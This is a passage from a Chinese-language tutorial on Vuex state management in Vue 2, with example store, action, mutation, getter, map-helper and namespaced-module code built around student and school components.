**<font style="color:#595959;">// 引入vuex 插件</font>**

**<font style="color:#595959;">import Vuex from "vuex";</font>**

**<font style="color:#595959;">// 使用插件</font>**

**<font style="color:#595959;">Vue.use(Vuex);</font>**

<font style="color:#595959;">// 创建store对象，它是vuex插件的老大，管理着action，mutations，state</font>



<font style="color:#595959;">// 创建三个对象</font>



<font style="color:#595959;">// 执行某个行为的对象</font>

<font style="color:#595959;">const actions = {};</font>

<font style="color:#595959;">// 负责更新的对象</font>

<font style="color:#595959;">const mutations = {};</font>

<font style="color:#595959;">// 状态对象</font>

<font style="color:#595959;">const state = {</font>

<font style="color:#595959;">    name:'jack'</font>

<font style="color:#595959;">};</font>



**<font style="color:#595959;">const store = new Vuex.Store({</font>**

**<font style="color:#595959;">  // 键，值对名字一样，可以简写</font>**

**<font style="color:#595959;">  actions,</font>**

**<font style="color:#595959;">  mutations,</font>**

**<font style="color:#595959;">  state,</font>**

**<font style="color:#595959;">});</font>**

<font style="color:#595959;">// 导出store对象，去main.js中去导入</font>

<font style="color:#595959;">export default store;</font>

### 5.2.4、 在main.js文件中关联store
这一步很重要，完成这一步之后，所有的vm和vc对象上会多一个**<font style="color:#FF0000;">$store属性</font>**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433660129-0cb71466-1857-4c83-a29f-99be656563fe.png)

## 5.3、 vuex实现一个最简单的案例 
需求：展示vuex中的num数据，并实现点击+1，在vuex中实现逻辑

app.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div class="app"></font>

<font style="color:#595959;">        <h1>app父组件</h1></font>

<font style="color:#595959;">        <h2>数据：{{ $store.state.num }}</h2></font>

<font style="color:#595959;">        <button @click="add">点我++</button></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>

<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'app',</font>

<font style="color:#595959;">    data() {</font>

<font style="color:#595959;">        return {</font>

<font style="color:#595959;">            msg: '我是app组件',</font>

<font style="color:#595959;">            startNum:0</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        add() {</font>

<font style="color:#595959;">            </font>**<font style="color:#595959;">// dispatch是$store的方法，调用这个方法，</font>**

**<font style="color:#595959;">            // 就是让store中的action中的add方法执行，并携带参数</font>**

**<font style="color:#595959;">            // 原则是，在现在这个方法里，只触发， 具体操作到vuex中的action中操作</font>**

**<font style="color:#595959;">            //</font>****<font style="color:#FF0000;">this.$store.dispatch('addOne',this.startNum)</font>**

<font style="color:#595959;">        </font>**<font style="color:#595959;">   // 第二种情况：如果你的逻辑处理确实比较简单，我们也可以直接通知mutations中的更新回调</font>**

**<font style="color:#595959;">            </font>****<font style="color:#FF0000;">this.$store.commit('ADD_ONE',this.startNum)</font>**

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    }</font>



<font style="color:#595959;">}</font>

store.js

<font style="color:#595959;">// 引入Vue</font>

<font style="color:#595959;">import Vue from "vue";</font>

<font style="color:#595959;">// 引入vuex 插件</font>

<font style="color:#595959;">import Vuex from "vuex";</font>

<font style="color:#595959;">// 使用插件</font>

<font style="color:#595959;">Vue.use(Vuex);</font>

<font style="color:#595959;">// 创建store对象，它是vuex插件的老大，管理着action，mutations，state</font>



<font style="color:#595959;">// 创建三个对象</font>



<font style="color:#595959;">// 执行某个行为的对象</font>

**<font style="color:#595959;">// 负责处理复杂的业务逻辑，或者发送ajax请求</font>**

**<font style="color:#FF0000;">const actions</font>****<font style="color:#FF0000;"> </font>**<font style="color:#595959;">= {</font>

<font style="color:#595959;">  // n个action，每一个都是一个回调函数（callback）</font>

<font style="color:#595959;">  // 回调函数何时触发，等着具体的命令</font>

**<font style="color:#FF0000;">  // 参数1:context参数：是vuex的上下文对象</font>**

**<font style="color:#FF0000;">  // 参数2:value参数：传过来的数据</font>**

<font style="color:#595959;">  addOne(context, value) {</font>

<font style="color:#595959;">    // 处理很多的业务逻辑，在初始值上加1</font>

<font style="color:#595959;">    value += 1;</font>

<font style="color:#595959;">    </font>**<font style="color:#595959;">// 业务逻辑都处理完后，提交上下文环境</font>**

<font style="color:#595959;">    </font>**<font style="color:#FF0000;">context.commit("ADD_ONE", value)</font>**<font style="color:#595959;">;</font>

<font style="color:#595959;">  </font>**<font style="color:#595959;">  // 这个context参数中还可以分法其他方法</font>**

**<font style="color:#595959;">    // context.dispatch("other", value);</font>**

**<font style="color:#595959;">  },</font>**

<font style="color:#595959;">  // other(context, value) {</font>

<font style="color:#595959;">  //   console.log("我是addOne分发处理下一个函数", value);</font>

<font style="color:#595959;">  // },</font>

<font style="color:#595959;">};</font>

**<font style="color:#FF0000;">// 负责更新的state</font>**

**<font style="color:#FF0000;">const mutations</font>**<font style="color:#595959;"> = {</font>

<font style="color:#595959;">  // n个mutations，每一个都是一个回调函数（callback）</font>

**<font style="color:#FF0000;">  // 参数1:state参数：状态对象</font>**

**<font style="color:#FF0000;">  // 参数2:value参数：上一个环节传递过来的数据</font>**

<font style="color:#595959;">  ADD_ONE(state, value) {</font>

<font style="color:#595959;">    state.num += value;</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">};</font>

**<font style="color:#595959;">// 状态对象(数据对象)，等同于Vue中的data，</font>****<font style="color:#FF0000;">并且已经做了响应式处理</font>**

<font style="color:#595959;">const state = {</font>

<font style="color:#595959;">  num: 1,</font>

<font style="color:#595959;">};</font>



<font style="color:#595959;">const store = new Vuex.Store({</font>

<font style="color:#595959;">  // 键，值对名字一样，可以简写</font>

<font style="color:#595959;">  actions,</font>

<font style="color:#595959;">  mutations,</font>

<font style="color:#595959;">  state,</font>

<font style="color:#595959;">});</font>

<font style="color:#595959;">// 导出store对象，去main.js中去导入</font>

<font style="color:#595959;">export default store;</font>

| <font style="color:rgb(0, 0, 0);">概念</font> | <font style="color:rgb(0, 0, 0);">作用</font> | <font style="color:rgb(0, 0, 0);">特点</font> |
| --- | --- | --- |
| <font style="color:rgb(0, 0, 0);">State</font> | <font style="color:rgb(0, 0, 0);">存储应用级状态（数据源）</font> | <font style="color:rgb(0, 0, 0);">响应式数据</font> |
| <font style="color:rgb(0, 0, 0);">Mutations</font> | <font style="color:rgb(0, 0, 0);">唯一修改state的方法（同步操作）</font> | <font style="color:rgb(0, 0, 0);">通过commit触发</font> |
| <font style="color:rgb(0, 0, 0);">Actions</font> | <font style="color:rgb(0, 0, 0);">处理异步操作和业务逻辑，可触发mutaions</font> | <font style="color:rgb(0, 0, 0);">通过dispatch触发</font> |
| <font style="color:rgb(0, 0, 0);">Getters</font> | <font style="color:rgb(0, 0, 0);">对state的计算属性（类似组件中的computed）</font> | <font style="color:rgb(0, 0, 0);">缓存计算结果</font> |
| <font style="color:rgb(0, 0, 0);">Modules</font> | <font style="color:rgb(0, 0, 0);">模块化分割大型状态树</font> | <font style="color:rgb(0, 0, 0);">避免单一store臃肿</font> |


## 5.4、 vuex工作原理 
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433660396-6b665a2f-86de-496b-b2ec-e540c57fbd28.png)



如果业务逻辑非常简单，也不需要发送AJAX请求的话，可以不调用dispatch方法，直接调用commit方法也是可以的。

<font style="color:#FF0000;">this.$store.commit()</font>

## 5.5、 多组件数据共享 
需求：实现兄弟组件之间数据的共享

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433660648-90094479-d525-4c17-a27d-c6b2256a8b22.png)

student.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div></font>

<font style="color:#595959;">        <input type="text" placeholder="请输入姓名" v-model="name"></font>

<font style="color:#595959;">        <button @click="saveStudent">保存学员信息</button></font>

<font style="color:#595959;">        <ul></font>

<font style="color:#595959;">            <li v-for="item in $store.state.studentName" :key="item.id">{{ item.name }}</li></font>

<font style="color:#595959;">        </ul></font>

<font style="color:#595959;">        <h2>学生数量是：{{ $store.state.studentName.length }}</h2></font>

<font style="color:#595959;">        <h2>学校数量是：{{ $store.state.schoolName.length }}</h2></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'student',</font>

<font style="color:#595959;">    data() {</font>

<font style="color:#595959;">        return {</font>

<font style="color:#595959;">            name: '',</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        saveStudent() {</font>

<font style="color:#595959;">            // this.studentName.unshift({ id: Date.now(), name: this.name })</font>

<font style="color:#595959;">            // this.$store.dispatch('saveStudent', { id: Date.now(), name: this.name })</font>

<font style="color:#595959;">           </font>**<font style="color:#595959;"> // 如果逻辑比较简单，可以不走action，直接comint</font>**

<font style="color:#595959;">            this.$store.commit('SAVE_STUDENT',{ id: Date.now(), name: this.name })</font>



<font style="color:#595959;">        }</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style></style></font>

school.vue 跟student.vue差不错

store.js

<font style="color:#595959;">import Vue from "vue";</font>

<font style="color:#595959;">import Vuex from "vuex";</font>

<font style="color:#595959;">Vue.use(Vuex);</font>

<font style="color:#595959;">const actions = {</font>

<font style="color:#595959;">  // 处理学校信息</font>

<font style="color:#595959;">  saveSchool(context, value) {</font>

<font style="color:#595959;">    context.commit("SAVE_SHOLLO", value);</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  //   处理学员信息</font>

<font style="color:#595959;">//   saveStudent(context, value) {</font>

<font style="color:#595959;">//     context.commit("SAVE_STUDENT", value);</font>

<font style="color:#595959;">//   },</font>

<font style="color:#595959;">};</font>

<font style="color:#595959;">const mutations = {</font>

<font style="color:#595959;">  SAVE_SHOLLO(state, value) {</font>

<font style="color:#595959;">    state.schoolName.unshift(value);</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  SAVE_STUDENT(state, value) {</font>

<font style="color:#595959;">    state.studentName.unshift(value);</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">};</font>

<font style="color:#595959;">const state = {</font>

<font style="color:#595959;">  studentName: [</font>

<font style="color:#595959;">    { id: "001", name: "孙悟空" },</font>

<font style="color:#595959;">    { id: "002", name: "猪八戒" },</font>

<font style="color:#595959;">    { id: "003", name: "唐三藏" },</font>

<font style="color:#595959;">    { id: "004", name: "沙悟净" },</font>

<font style="color:#595959;">  ],</font>

<font style="color:#595959;">  schoolName: [</font>

<font style="color:#595959;">    { id: "001", name: "清华大学" },</font>

<font style="color:#595959;">    { id: "002", name: "北京大学" },</font>

<font style="color:#595959;">    { id: "003", name: "中科大" },</font>

<font style="color:#595959;">    { id: "004", name: "合工大" },</font>

<font style="color:#595959;">  ],</font>

<font style="color:#595959;">};</font>

<font style="color:#595959;">export default new Vuex.Store({</font>

<font style="color:#595959;">  actions,</font>

<font style="color:#595959;">  mutations,</font>

<font style="color:#595959;">  state,</font>

<font style="color:#595959;">});</font>

## 5.6 、getters配置项
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433660940-03ad7f89-bb2c-4f45-abe8-c27bfd4ef320.png)

1. 如果想将state中的数据进行加工计算，并且这个计算逻辑复杂，而且要在多个位置使用，建议使用getters配置项。

2. 怎么用？

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433661239-4e22a3b0-9f01-4ffe-a56a-e07fb7b98563.png)

3、拿取getter数据

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div></font>

<font style="color:#595959;">        <input type="text" v-model="$store.state.username"><br></font>

<font style="color:#595959;">        <h2>反转之后的名字：{{ $store.getters.reverseName }}</h2></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>

类似于Vue当中的：data和computed的关系

## 5.7 、mapState和mapGetters的使用（优化计算属性）
1. 组件中在使用state上的数据和getters上的数据时，都有固定的前缀：

{{<font style="color:#FF0000;">this.$store.state.</font>name}}

{{<font style="color:#FF0000;">this.$store.getters.</font>reverseName}}

使用mapState和mapGetters进行名称映射，可以简化以上的写法。

2. 使用mapState和mapGetters的前提是先引入

import {mapState, mapGetters} from ‘vuex’

3. mapState如何使用，在computed当中使用ES6的语法

(1) 第一种方式：对象形式

① ...mapState({name:’name’})

(2) 第二种方式：数组形式

① ...mapState([‘name’])

(3) 插值语法就可以修改为：{{name}}

4. mapGetters如何使用在computed当中使用ES6的语法

(1) 第一种方式：对象形式

① ...mapGetters({reverseName:’reverseName’})

(2) 第二种方式：数组形式

① ...mapGetters([‘reverseName’])

(3) 插值语法就可以修改为：{{reverseName}} 

<font style="color:#FF0001;">注意：mapState，mapGetters获取的值，默认是计算属性通过简写方式计算出来的，只能读，不能修改，如果要进行修改，需要computed完整形式，加setter方法</font>

<font style="color:#595959;"><script></font>

<font style="color:#595959;">import { mapGetters, mapState } from 'vuex'</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'school',</font>

<font style="color:#595959;">    data() {</font>

<font style="color:#595959;">        return {</font>

<font style="color:#595959;">            name: '',</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    computed: {</font>

<font style="color:#595959;">       // 1、mapState  </font>

<font style="color:#595959;">        //1.1 通过计算属性，返回需要的数据==》手写</font>

<font style="color:#595959;">        //注意：类似这样 固定格式的代码，就可以自动生成</font>

<font style="color:#595959;">        // schoolName() {</font>

<font style="color:#595959;">        //     return this.$store.state.schoolName</font>

<font style="color:#595959;">        // },</font>

<font style="color:#595959;">        // studentName() {</font>

<font style="color:#595959;">        //     return this.$store.state.studentName</font>

<font style="color:#595959;">        // }</font>

<font style="color:#595959;">        // </font>

<font style="color:#595959;">        //1.2  vuex帮我们自动生成的，mapState（）返回的是一个对象，所以用...打开对象</font>

<font style="color:#595959;">        //1.2.1 对象形式</font>

<font style="color:#595959;">        // ...mapState({ schoolName: 'schoolName', studentName: 'studentName' })</font>

<font style="color:#595959;">        //1.2.2 数组形式 (计算属性的名字跟state中的属性名一致)</font>

<font style="color:#595959;">        ...mapState(['schoolName', 'studentName']),</font>

<font style="color:#595959;">        //2、mapGetters 数组形式</font>

<font style="color:#595959;">        ...mapGetters(['reverseName'])</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        saveSchool() {</font>

<font style="color:#595959;">            // this.schoolName.unshift({ id: Date.now(), name: this.name })</font>

<font style="color:#595959;">            this.$store.dispatch('saveSchool', { id: Date.now(), name: this.name })</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

## 5.8、 mapMutations和mapActions的使用（优化methods） 
student.vue

<font style="color:#595959;">import {mapMutations, mapActions} from ‘vuex’</font>

<font style="color:#595959;">···</font>

<font style="color:#595959;">  methods: {</font>

<font style="color:#595959;">        // saveStudent() {</font>

<font style="color:#595959;">        //     // this.studentName.unshift({ id: Date.now(), name: this.name })</font>

<font style="color:#595959;">        //     // this.$store.dispatch('saveStudent', { id: Date.now(), name: this.name })</font>

<font style="color:#595959;">        //     // 如果逻辑比较简单，可以不走action，直接comint</font>

<font style="color:#595959;">        //     this.$store.commit('SAVE_STUDENT', this.name)</font>

<font style="color:#595959;">        // }</font>

<font style="color:#595959;">        </font>

<font style="color:#595959;">        // 对象写法  需要传递的参数，在模版中传递</font>

<font style="color:#595959;">        // ...mapMutations({ saveStudent: 'SAVE_STUDENT' })</font>

<font style="color:#595959;">        // 数组写法  ==  SAVE_STUDENT：'SAVE_STUDENT' ,如果这么写，绑定的函数名要换成SAVE_STUDENT</font>

<font style="color:#595959;">        ...mapMutations(['SAVE_STUDENT'])</font>



<font style="color:#595959;">    }</font>

school.vue

<font style="color:#595959;">import {mapMutations, mapActions} from ‘vuex’</font>

<font style="color:#595959;">····</font>

<font style="color:#595959;">    //2、 打印mapState()</font>

<font style="color:#595959;">    // 2.1 打印mapState()</font>

<font style="color:#595959;"> mounted() {</font>

<font style="color:#595959;">     // vuex会根据我们传入的参数，自动生成计算属性代码</font>

<font style="color:#595959;">     const xx = mapState({ schoolName: 'schoolName', studentName: 'studentName' })</font>

<font style="color:#595959;">     console.log(xx);</font>

<font style="color:#595959;"> },</font>

<font style="color:#595959;">methods: {</font>

<font style="color:#595959;">        // 2.2 手动的调用方法，去触发actions</font>

<font style="color:#595959;">        // saveSchool() {</font>

<font style="color:#595959;">        //     this.$store.dispatch('saveSchool', this.name)</font>

<font style="color:#595959;">        // },</font>

<font style="color:#595959;">        // 2.3 mapActions()根据传入的参数，会自动生成代码，触发actions,需要传递的参数，在模版中传递</font>

<font style="color:#595959;">        ...mapActions({ saveSchool: 'saveSchool' })</font>

<font style="color:#595959;">    }</font>

store.js

<font style="color:#595959;">import Vue from "vue";</font>

<font style="color:#595959;">import Vuex from "vuex";</font>

<font style="color:#595959;">Vue.use(Vuex);</font>

<font style="color:#595959;">const actions = {</font>

<font style="color:#595959;">  // 处理学校信息</font>

<font style="color:#595959;">  saveSchool(context, value) {</font>

<font style="color:#595959;">    context.commit("SAVE_SHOLLO", { id: Date.now(), name: value });</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  //   处理学员信息</font>

<font style="color:#595959;">  //   saveStudent(context, value) {</font>

<font style="color:#595959;">  //     context.commit("SAVE_STUDENT", value);</font>

<font style="color:#595959;">  //   },</font>

<font style="color:#595959;">};</font>

<font style="color:#595959;">const mutations = {</font>

<font style="color:#595959;">  SAVE_SHOLLO(state, value) {</font>

<font style="color:#595959;">    state.schoolName.unshift(value);</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  SAVE_STUDENT(state,value) {</font>

<font style="color:#595959;">    state.studentName.unshift({ id: Date.now(), name: value });</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">};</font>

<font style="color:#595959;">const state = {</font>

<font style="color:#595959;">  username: "",</font>

<font style="color:#595959;">  studentName: [</font>

<font style="color:#595959;">    { id: "001", name: "孙悟空" },</font>

<font style="color:#595959;">    { id: "002", name: "猪八戒" },</font>

<font style="color:#595959;">    { id: "003", name: "唐三藏" },</font>

<font style="color:#595959;">    { id: "004", name: "沙悟净" },</font>

<font style="color:#595959;">  ],</font>

<font style="color:#595959;">  schoolName: [</font>

<font style="color:#595959;">    { id: "001", name: "清华大学" },</font>

<font style="color:#595959;">    { id: "002", name: "北京大学" },</font>

<font style="color:#595959;">    { id: "003", name: "中科大" },</font>

<font style="color:#595959;">    { id: "004", name: "合工大" },</font>

<font style="color:#595959;">  ],</font>

<font style="color:#595959;">};</font>

<font style="color:#595959;">// getters :每一个getter可以看做一个全新的计算属性</font>

<font style="color:#595959;">// getter方法会自动接收一个state对象</font>

<font style="color:#595959;">const getters = {</font>

<font style="color:#595959;">  reverseName(state) {</font>

<font style="color:#595959;">    return state.username.split("").reverse().join("");</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">};</font>

<font style="color:#595959;">export default new Vuex.Store({</font>

<font style="color:#595959;">  actions,</font>

<font style="color:#595959;">  mutations,</font>

<font style="color:#595959;">  state,</font>

<font style="color:#595959;">  getters,</font>

<font style="color:#595959;">});</font>

## 5.9 、vuex的模块化开发 
### 5.9.1 未使用mapXxxx的模块化开发
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433661491-856078ff-26d3-4dc8-b205-fc0d7388a3e3.png)

#### 1、未使用模块化完成
student.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div></font>

<font style="color:#595959;">        <h1>student</h1></font>

<font style="color:#595959;">        <h2>studentNum：{{ $store.state.studentNum }}</h2></font>

<font style="color:#595959;">        <h3>reverseStudentName:{{ $store.getters.reverseStudentName }}</h3></font>

<font style="color:#595959;">        <button @click="stuNumFun">stuNum++</button></font>

<font style="color:#595959;">        <button @click="stuNameFun">stuName+@</button></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'student',</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        stuNumFun() {</font>

<font style="color:#595959;">            this.$store.dispatch('stuNumFun')</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        stuNameFun() {</font>

<font style="color:#595959;">            this.$store.commit('STU_NAME_FUN')</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style></style></font>

school.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div></font>

<font style="color:#595959;">        <h1>school</h1></font>

<font style="color:#595959;">        <h2>schoolNum：{{ $store.state.schoolNum }}</h2></font>

<font style="color:#595959;">        <h2>reverseSchoolName:{{ $store.getters.reverseSchoolName }}</h2></font>

<font style="color:#595959;">        <button @click="schNumFun">schNum++</button></font>

<font style="color:#595959;">        <button @click="schNameFun">schName+@</button></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'school',</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        schNumFun() {</font>

<font style="color:#595959;">            this.$store.dispatch('schNumFun')</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        schNameFun() {</font>

<font style="color:#595959;">            // 直接commit</font>

<font style="color:#595959;">            this.$store.commit('SCH_NAME_FUN')</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style></style></font>

store.js

<font style="color:#595959;">import Vue from "vue";</font>

<font style="color:#595959;">import Vuex from "vuex";</font>

<font style="color:#595959;">Vue.use(Vuex);</font>



<font style="color:#595959;">const actions = {</font>

<font style="color:#595959;">  // 学校actions</font>

<font style="color:#595959;">  schNumFun(context) {</font>

<font style="color:#595959;">    context.commit("SCH_NUM_FUN");</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  // 学生actions</font>

<font style="color:#595959;">  stuNumFun(context) {</font>

<font style="color:#595959;">    context.commit("STU_NUM_FUN");</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">};</font>

<font style="color:#595959;">const mutations = {</font>

<font style="color:#595959;">  // 学校mutations</font>

<font style="color:#595959;">  SCH_NUM_FUN(state) {</font>

<font style="color:#595959;">    state.schoolNum += 1;</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  SCH_NAME_FUN(state) {</font>

<font style="color:#595959;">    state.schoolName += "@";</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  // 学生mutations</font>

<font style="color:#595959;">  STU_NUM_FUN(state) {</font>

<font style="color:#595959;">    state.studentNum += 2;</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  STU_NAME_FUN(state) {</font>

<font style="color:#595959;">    state.studentName += "!";</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">};</font>

<font style="color:#595959;">const getters = {</font>

<font style="color:#595959;">  // 学校名反转</font>

<font style="color:#595959;">  reverseSchoolName(state) {</font>

<font style="color:#595959;">    return state.schoolName.split("").reverse().join("");</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  // 学生名反转</font>

<font style="color:#595959;">  reverseStudentName(state) {</font>

<font style="color:#595959;">    return state.studentName.split("").reverse().join("");</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">};</font>

<font style="color:#595959;">const state = {</font>

<font style="color:#595959;">  // 学校数据</font>

<font style="color:#595959;">  schoolNum: 66,</font>

<font style="color:#595959;">  schoolName: "北京大学",</font>

<font style="color:#595959;">  // 学生数据</font>

<font style="color:#595959;">  studentNum: 5,</font>

<font style="color:#595959;">  studentName: "章三",</font>

<font style="color:#595959;">};</font>



<font style="color:#595959;">export default new Vuex.Store({</font>

<font style="color:#595959;">  state,</font>

<font style="color:#595959;">  actions,</font>

<font style="color:#595959;">  mutations,</font>

<font style="color:#595959;">  getters,</font>

<font style="color:#595959;">});</font>

#### 2、模块化实现
将原来写的store.js拆分成若干js

student.js

<font style="color:#595959;">// student 模块</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  // 开启命名空间</font>

<font style="color:#595959;">  namespaced: true,</font>

<font style="color:#595959;">  actions: {</font>

<font style="color:#595959;">     // 学生actions</font>

<font style="color:#595959;">  stuNumFun(context) {</font>

<font style="color:#595959;">    context.commit("STU_NUM_FUN");</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  mutations: {</font>

<font style="color:#595959;">    // 学生mutations</font>

<font style="color:#595959;">    STU_NUM_FUN(state) {</font>

<font style="color:#595959;">      state.studentNum += 2;</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    STU_NAME_FUN(state) {</font>

<font style="color:#595959;">      state.studentName += "!";</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  getters: {</font>

<font style="color:#595959;">    // 学生名反转</font>

<font style="color:#595959;">    reverseStudentName(state) {</font>

<font style="color:#595959;">      return state.studentName.split("").reverse().join("");</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  state: {</font>

<font style="color:#595959;">    // 学生数据</font>

<font style="color:#595959;">    studentNum: 5,</font>

<font style="color:#595959;">    studentName: "章三",</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">};</font>

school.js

<font style="color:#595959;">// school 模块</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  // 开启命名空间</font>

<font style="color:#595959;">  namespaced: true,</font>

<font style="color:#595959;">  actions: {</font>

<font style="color:#595959;">      // 学校actions</font>

<font style="color:#595959;">  schNumFun(context) {</font>

<font style="color:#595959;">    context.commit("SCH_NUM_FUN");</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  mutations: {</font>

<font style="color:#595959;">    // 学校mutations</font>

<font style="color:#595959;">    SCH_NUM_FUN(state) {</font>

<font style="color:#595959;">      state.schoolNum += 1;</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    SCH_NAME_FUN(state) {</font>

<font style="color:#595959;">      state.schoolName += "@";</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  getters: {</font>

<font style="color:#595959;">    // 学校名反转</font>

<font style="color:#595959;">    reverseSchoolName(state) {</font>

<font style="color:#595959;">      return state.schoolName.split("").reverse().join("");</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  state: {</font>

<font style="color:#595959;">    // 学校数据</font>

<font style="color:#595959;">    schoolNum: 66,</font>

<font style="color:#595959;">    schoolName: "北京大学",</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">};</font>

store.js

将若干js文件，引入到store.js

<font style="color:#595959;">import Vue from "vue";</font>

<font style="color:#595959;">import Vuex from "vuex";</font>

<font style="color:#595959;">Vue.use(Vuex);</font>



<font style="color:#595959;">// 导入各vuex模块</font>

<font style="color:#595959;">import student from "./student";</font>

<font style="color:#595959;">import school from "./school";</font>



<font style="color:#595959;">export default new Vuex.Store({</font>

<font style="color:#595959;">  modules: {</font>

<font style="color:#595959;">    student,</font>

<font style="color:#595959;">    school,</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">});</font>

student.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div></font>

<font style="color:#595959;">        <h1>student</h1></font>

<font style="color:#595959;">        <h2>studentNum：{{ $store.state.student.studentNum }}</h2></font>

<font style="color:#595959;">        <h3>reverseStudentName:{{ $store.getters['student/reverseStudentName'] }}</h3></font>

<font style="color:#595959;">        <button @click="stuNumFun">stuNum++</button></font>

<font style="color:#595959;">        <button @click="stuNameFun">stuName+@</button></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'student',</font>

<font style="color:#595959;">    mounted() {</font>

<font style="color:#595959;">        console.log(this.$store);</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        stuNumFun() {</font>

<font style="color:#595959;">            this.$store.dispatch('student/stuNumFun')</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        stuNameFun() {</font>

<font style="color:#595959;">            this.$store.commit('student/STU_NAME_FUN')</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style></style></font>

school.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div></font>

<font style="color:#595959;">        <h1>school</h1></font>

<font style="color:#595959;">        <h2>schoolNum：{{ $store.state.school.schoolNum }}</h2></font>

<font style="color:#595959;">        <h2>reverseSchoolName:{{ $store.getters['school/reverseSchoolName'] }}</h2></font>

<font style="color:#595959;">        <button @click="schNumFun">schNum++</button></font>

<font style="color:#595959;">        <button @click="schNameFun">schName+@</button></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'school',</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        schNumFun() {</font>

